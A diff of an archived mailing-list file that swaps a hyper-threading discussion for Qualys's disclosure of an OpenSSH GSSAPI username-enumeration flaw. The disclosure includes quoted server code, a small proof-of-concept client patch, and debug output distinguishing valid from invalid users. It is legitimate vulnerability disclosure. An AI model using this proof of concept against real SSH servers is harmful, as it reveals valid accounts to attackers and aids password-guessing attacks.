@@ -1,43 +1,177 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/06/21/7
-Message-ID: <20180621125049.GA14978@openwall.com>
-Date: Thu, 21 Jun 2018 14:50:49 +0200
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/27/2
+Message-ID: <20180827162730.GA24878@localhost.localdomain>
+Date: Mon, 27 Aug 2018 09:27:30 -0700
+From: Qualys Security Advisory <qsa@...lys.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Intel hyper-threading security issues
+Subject: Another OpenSSH "user enumeration"
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Jun 21, 2018 at 01:54:16PM +0200, Sven Schwedas wrote:
-> On 2018-06-21 12:28, Lukas Odzioba wrote:
-> > Or use cpu hotplug mechanism, which should be way more convenient:
-> > https://www.kernel.org/doc/html/v4.17/core-api/cpu_hotplug.html
-> 
-> Hotplug doesn't seem differentiate between HT threads and physical
-> cores,
+Hi all,
 
-This isn't exactly the question to ask: first vs. second thread in a
-core aren't any different, neither of them is "the physical core" unless
-you choose not to use the other.
+On August 24, 2018, we sent the following email to openssh@...nssh.com
+and distros@...openwall.org. About the disclosure of this issue, Solar
+Designer wrote "I'd be even happier with it being made public right away
+if that's OK with both the OpenSSH team and Qualys", and Theo de Raadt
+wrote "More than reporting to us, I urge you to publish it"; for a
+detailed explanation, please refer to Damien Miller's post:
 
-And you can obtain the needed information from /proc/cpuinfo or
-/sys/devices/system/cpu/cpu*/topology/* to choose which logical CPUs you
-disable (so that you leave only one per physical core).
+http://www.openwall.com/lists/oss-security/2018/08/24/1
 
-On a related note, attached is a generic Linux /proc/cpuinfo parser I
-wrote a couple of years ago for SMT-aware thread affinity settings in a
-userspace program.  This can be used e.g. by a program not wanting to
-run trusted vs. untrusted threads on the same physical core, or on the
-same physical CPU chip if there's more than one.  It can also be used
-for performance optimization.  Please feel free to reuse.
+We thank the OpenSSH developers and the members of
+distros@...openwall.org for their constructive comments, suggestions,
+and feedback.
 
-> will setting maxcpus=2 on a 2 cores+HT machine reliably disable
-> HT, or can it disable one core and keep HT active on the other?
+========================================================================
 
-The latter.  It's not reliable, except maybe on a specific machine with
-a specific kernel version.
+While properly reviewing the now-famous OpenSSH commit
+https://github.com/openbsd/src/commit/779974d35b4859c07bc3cb8a12c74b43b0a7d1e0
+we discovered another username-enumeration vulnerability in auth2-gss.c
+(enabled by default on at least Fedora, CentOS, and Red Hat Enterprise
+Linux).
 
-Alexander
+This vulnerability affects OpenSSH versions from 5.9 (September 6, 2011)
+to the recently released 7.8 (August 24, 2018), inclusive. It is quite
+similar to CVE-2018-15473 (it is not a timing attack), but it is also
+markedly different (code excerpts from OpenSSH 7.8p1):
 
-View attachment "cpuinfo.h" of type "text/x-c" (1303 bytes)
+ 61 static int
+ 62 userauth_gssapi(struct ssh *ssh)
+ 63 {
+...
+106         if (!authctxt->valid || authctxt->user == NULL) {
+107                 debug2("%s: disabled because of invalid user", __func__);
+108                 free(doid);
+109                 return (0);
+110         }
+111 
+112         if (GSS_ERROR(PRIVSEP(ssh_gssapi_server_ctx(&ctxt, &goid)))) {
+113                 if (ctxt != NULL)
+114                         ssh_gssapi_delete_ctx(&ctxt);
+115                 free(doid);
+116                 authctxt->server_caused_failure = 1;
+117                 return (0);
+118         }
+...
+123         if ((r = sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_RESPONSE)) != 0 ||
+124             (r = sshpkt_put_string(ssh, doid, len)) != 0 ||
+125             (r = sshpkt_send(ssh)) != 0)
+...
+132         authctxt->postponed = 1;
+133 
+134         return (0);
+135 }
 
-View attachment "cpuinfo.c" of type "text/x-c" (3804 bytes)
+- If this first step of the GSSAPI authentication succeeds, then
+  "postponed" is set to 1 (at line 132) and the server sends a packet
+  SSH2_MSG_USERAUTH_GSSAPI_RESPONSE to the attacker (at lines 123-125):
+  in this particular case, the user is necessarily valid (it exists).
+
+- Otherwise "postponed" is not set, and userauth_gssapi() returns 0 at
+  line 117 or 109: in both cases, the server's userauth_finish() sends a
+  packet SSH2_MSG_USERAUTH_FAILURE to the attacker, who should therefore
+  be unable to distinguish between a valid and invalid user. However, if
+  the user is valid, then "server_caused_failure" is set (at line 116);
+  if the user is invalid, it is not set. Consequently, the behavior of
+  userauth_finish() changes:
+
+340 void
+341 userauth_finish(struct ssh *ssh, int authenticated, const char *method,
+342     const char *submethod)
+343 {
+...
+410                 if (!partial && !authctxt->server_caused_failure &&
+411                     (authctxt->attempt > 1 || strcmp(method, "none") != 0))
+412                         authctxt->failures++;
+413                 if (authctxt->failures >= options.max_authtries) {
+...
+417                         auth_maxtries_exceeded(authctxt);
+418                 }
+...
+422                 packet_start(SSH2_MSG_USERAUTH_FAILURE);
+423                 packet_put_cstring(methods);
+424                 packet_put_char(partial);
+425                 packet_send();
+...
+429 }
+
+  . if the user is valid, then "server_caused_failure" is set,
+    "failures" is not incremented, and the attacker can attempt the
+    GSSAPI authentication indefinitely;
+
+  . if the user is invalid, then "server_caused_failure" is not set,
+    "failures" is incremented (at line 412), and the server will
+    disconnect the attacker (at line 417) after max_authtries
+    authentication attempts (6, by default).
+
+Below is a very crude proof-of-concept (a patch for the client in
+OpenSSH 7.8p1):
+
+------------------------------------------------------------------------
+
+diff -pruN openssh-7.8p1/gss-genr.c openssh-7.8p1-poc/gss-genr.c
+--- openssh-7.8p1/gss-genr.c	2018-08-22 22:41:42.000000000 -0700
++++ openssh-7.8p1-poc/gss-genr.c	2018-08-22 22:41:42.000000000 -0700
+@@ -286,6 +286,7 @@ ssh_gssapi_check_mechanism(Gssctxt **ctx
+ 
+ 	ssh_gssapi_build_ctx(ctx);
+ 	ssh_gssapi_set_oid(*ctx, oid);
++	return 1;
+ 	major = ssh_gssapi_import_name(*ctx, host);
+ 	if (!GSS_ERROR(major)) {
+ 		major = ssh_gssapi_init_ctx(*ctx, 0, GSS_C_NO_BUFFER, &token, 
+diff -pruN openssh-7.8p1/sshconnect2.c openssh-7.8p1-poc/sshconnect2.c
+--- openssh-7.8p1/sshconnect2.c	2018-08-22 22:41:42.000000000 -0700
++++ openssh-7.8p1-poc/sshconnect2.c	2018-08-22 22:41:42.000000000 -0700
+@@ -701,6 +701,7 @@ userauth_gssapi(Authctxt *authctxt)
+ 	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, &input_gssapi_token);
+ 	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERROR, &input_gssapi_error);
+ 	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERRTOK, &input_gssapi_errtok);
++	return 1;
+ 
+ 	mech++; /* Move along to next candidate */
+ 
+------------------------------------------------------------------------
+
+For example, on Fedora, "adm" is a valid user, but "pocorgtfo" is not:
+
+------------------------------------------------------------------------
+
+./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic adm@....0.0.1
+...
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+...
+
+./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic pocorgtfo@....0.0.1
+...
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+debug1: Authentications that can continue: publickey,gssapi-with-mic,password
+Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
+Disconnected from 127.0.0.1 port 22
+
+------------------------------------------------------------------------
+
+We understand that the OpenSSH developers do not want to treat such a
+username enumeration (or "oracle") as a vulnerability (although it is
+quite useful in an attacker's toolbox), but how should we coordinate
+this disclosure, then? OpenSSH developers, distros, please advise.
+
+Thank you very much! With best regards,
+
+-- 
+the Qualys Security Advisory team
